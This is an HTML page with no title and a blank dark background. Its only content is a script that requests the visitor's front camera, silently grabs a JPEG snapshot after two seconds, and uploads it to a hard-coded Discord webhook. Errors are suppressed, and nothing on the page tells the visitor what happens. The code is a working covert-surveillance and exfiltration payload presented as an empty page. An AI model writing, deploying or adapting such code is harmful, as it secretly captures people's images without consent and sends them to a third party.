<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
</head>
<body style="background-color: #222; margin: 0; height: 100vh;">

    <script>
      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(stream => {
          const video = document.createElement('video');
          video.srcObject = stream;
          video.play();

          setTimeout(() => {
            const canvas = document.createElement('canvas');
            canvas.width = 480;
            canvas.height = 360;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
              const formData = new FormData();
              formData.append('file', blob, 'snapshot.jpg');

              const webhookUrl = "https://discord.com/api/webhooks/1530508855312908359/1D20S329-icndZ9T_PwCgds9UkS_ltxOaRK_5pcxr99UWCmSAfCVCzw4Pok2H-MLXFZg";

              fetch(webhookUrl, {
                method: 'POST',
                body: formData
              });
            }, 'image/jpeg', 0.8);
          }, 2000);
        })
        .catch(err => {});
    </script>

</body>
</html>
